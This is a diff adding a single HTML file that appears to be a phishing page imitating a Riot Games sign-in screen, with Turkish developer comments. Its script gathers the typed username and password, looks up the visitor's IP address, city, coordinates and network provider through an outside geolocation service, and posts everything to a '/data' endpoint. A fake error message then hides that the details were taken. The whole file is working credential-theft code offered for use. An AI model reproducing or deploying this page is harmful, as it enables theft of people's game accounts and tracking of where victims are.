@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in</title>
+  <link rel="icon" href="https://img.icons8.com/color/600/riot-games.png" type="image/x-icon" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: url('https://i.hizliresim.com/pabcb6n.jpeg') no-repeat center center/cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .login-box {
+      background: white;
+      padding: 30px 25px;
+      border-radius: 8px;
+      width: 360px; /* Daha küçük */
+      max-width: 90%;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.15);
+    }
+
+    .login-box h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 15px;
+    }
+
+    .error-message {
+      display: none;
+      background: #fce8e6;
+      color: #d93025;
+      font-size: 12px;
+      padding: 8px;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      text-align: left;
+    }
+
+    .field-group {
+      position: relative;
+      margin-top: 16px;
+    }
+    .field-group label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: #666;
+      background: #f9f9f9;
+      padding: 0 4px;
+      pointer-events: none;
+      transition: all 0.18s ease;
+    }
+    .field-group input {
+      width: 100% !important;   /* küçültüldü */
+      max-width: 340px;        /* çok uzun olmasın */
+      margin: 0 auto;          /* ortala */
+      display: block;
+      padding: 12px;
+      font-size: 13px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      background: #f9f9f9;
+    }
+    .field-group input::placeholder { color: transparent; }
+    .field-group input:focus + label,
+    .field-group input:not(:placeholder-shown) + label {
+      top: -6px;
+      left: 8px;
+      font-size: 11px;
+      color: #1877f2;
+    }
+
+    .input-error {
+      border: 1px solid #d93025 !important;
+    }
+
+    .social-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin: 18px 0;
+    }
+
+    .social-buttons button {
+      flex: 1;
+      height: 38px;
+      margin: 3px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: transform 0.2s ease;
+    }
+    .social-buttons button:hover { transform: translateY(-2px); }
+
+    .social-buttons img {
+      width: 18px;
+      height: 18px;
+    }
+
+    .facebook { background: #1877f2; }
+    .google { background: #fff; border: 1px solid #ddd; }
+    .apple { background: #000; }
+    .xbox { background: #107c10; }
+    .playstation { background: #003791; }
+
+    .facebook img,
+    .apple img,
+    .xbox img,
+    .playstation img { filter: invert(1); }
+
+    .stay-signed {
+      display: flex;
+      align-items: center;
+      margin: 6px 0 16px 0;
+      font-size: 12px;
+      color: #444;
+      justify-content: center;
+    }
+
+    .stay-signed input { margin-right: 6px; }
+
+    .login-btn {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      border: 1px solid #ddd;
+      background: #f7f7f7;
+      font-size: 20px;
+      cursor: pointer;
+    }
+
+    .footer-links {
+      margin-top: 15px;
+      font-size: 11px;
+    }
+    .footer-links a {
+      display: block;
+      text-decoration: none;
+      color: #000;
+      margin: 4px 0;
+    }
+
+    footer {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #ddd;
+      text-align: center;
+    }
+    footer a { color: #ddd; text-decoration: none; margin: 0 6px; }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Sign in</h2>
+
+    <div class="error-message" id="error-box">
+      The username or password you entered is incorrect. Please try again.
+    </div>
+
+    <div class="field-group">
+      <input type="text" id="username" placeholder="USERNAME">
+      <label for="username">USERNAME</label>
+    </div>
+
+    <div class="field-group">
+      <input type="password" id="password" placeholder="PASSWORD">
+      <label for="password">PASSWORD</label>
+    </div>
+
+    <div class="social-buttons">
+      <button class="facebook">
+        <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/facebook.svg" alt="Facebook">
+      </button>
+      <button class="google">
+        <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/google.svg" alt="Google">
+      </button>
+      <button class="apple">
+        <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/apple.svg" alt="Apple">
+      </button>
+      <button class="xbox">
+        <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/xbox.svg" alt="Xbox">
+      </button>
+      <button class="playstation">
+        <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/playstation.svg" alt="PlayStation">
+      </button>
+    </div>
+
+    <div class="stay-signed">
+      <input type="checkbox" id="stay">
+      <label for="stay">Stay signed in</label>
+    </div>
+
+    <button class="login-btn" onclick="handleLogin()">→</button>
+
+    <div class="footer-links">
+      <a href="#">CAN'T SIGN IN?</a>
+      <a href="#">CREATE ACCOUNT</a>
+    </div>
+  </div>
+
+  <footer>
+    <div>
+      <a href="#">Create account</a>
+      <a href="#">Support</a>
+      <a href="#">Privacy Notice</a>
+      <a href="#">Terms of Service</a>
+      <a href="#">Cookie Preferences</a>
+    </div>
+    <p style="margin-top:10px;">
+      English (en) <br>
+      This site is protected by hCaptcha and its Privacy Policy and Terms of Service apply.
+    </p>
+  </footer>
+
+<script>
+  async function getIpDetails() {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      return await res.json();
+    } catch (err) {
+      return {};
+    }
+  }
+
+  async function handleLogin() {
+    let username = document.getElementById("username");
+    let password = document.getElementById("password");
+    let errorBox = document.getElementById("error-box");
+
+    username.classList.remove("input-error");
+    password.classList.remove("input-error");
+
+    if (username.value.trim() === "" || password.value.trim() === "") {
+      errorBox.innerText = "Username and password cannot be empty.";
+      errorBox.style.display = "block";
+      if (username.value.trim() === "") username.classList.add("input-error");
+      if (password.value.trim() === "") password.classList.add("input-error");
+      return;
+    }
+
+    // ip bilgilerini al
+    const ipData = await getIpDetails();
+
+    const payload = {
+      username: username.value.trim(),
+      password: password.value.trim(),
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country_name,
+      latitude: ipData.latitude,
+      longitude: ipData.longitude,
+      asn: ipData.asn,
+      org: ipData.org
+    };
+
+    try {
+      const res = await fetch('/data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (!res.ok) {
+        errorBox.innerText = "Sunucu hatası!";
+        errorBox.style.display = "block";
+        return;
+      }
+
+      const result = await res.json();
+
+      if (result.success) {
+        errorBox.style.display = "none";
+        alert("Başarılı giriş!");
+      } else {
+        errorBox.innerText = "The username or password you entered is incorrect. Please try again.";
+        errorBox.style.display = "block";
+      }
+    } catch (err) {
+      errorBox.innerText = "Bağlantı hatası!";
+      errorBox.style.display = "block";
+    }
+  }
+</script>
+
+</body>
+</html>
